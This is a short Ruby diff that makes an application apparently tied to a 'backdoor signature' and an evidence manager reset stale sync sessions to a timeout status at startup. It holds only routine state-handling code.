@@ -6,6 +6,7 @@
 require_relative 'events.rb'
 require_relative 'config.rb'
 require_relative 'db.rb'
+require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -74,6 +75,10 @@ class Application
 
       # do not continue if we don't have the global backdoor signature
       end while DB.instance.backdoor_signature.nil?
+
+      # if some instance are still in SYNC_IN_PROGRESS status, reset it to
+      # SYNC_TIMEOUT. we are starting now, so no valid session can exist
+      EvidenceManager.instance.sync_timeout_all
 
       # enter the main loop (hopefully will never exit from it)
       Events.new.setup Config.instance.global['LISTENING_PORT']
